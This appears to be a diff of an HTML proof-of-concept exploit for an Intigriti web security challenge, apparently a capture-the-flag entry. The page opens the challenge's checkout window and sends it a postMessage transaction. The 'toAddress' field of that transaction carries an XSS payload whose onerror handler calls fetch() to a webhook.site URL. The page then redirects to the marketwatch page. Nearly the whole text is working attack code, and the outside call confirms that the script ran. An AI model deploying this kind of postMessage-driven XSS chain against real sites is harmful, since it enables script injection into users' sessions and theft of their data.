@@ -2,16 +2,13 @@
 <body>
     <script>
         const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=0.00000001", "_blank");
-
-        // الـ Payload المستهدف لصفحة الـ Marketwatch
         const xssPayload = '"><img src=x onerror="fetch(`https://webhook.site/963c1110-c016-402c-8258-3f38833936f3/XSS_SUCCESS`)"><"';
-
         const payload = {
             type: "submitTransaction",
             transaction: {
                 toAddress: xssPayload,
                 currency: '1337COIN',
-                amount: 1 
+                amount: 1337
             }
         };
 
@@ -20,8 +17,7 @@
                 win.postMessage(payload, "*");
             }
         }, 1000);
-
-   
+        
         setTimeout(() => {
             window.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
         }, 5000);
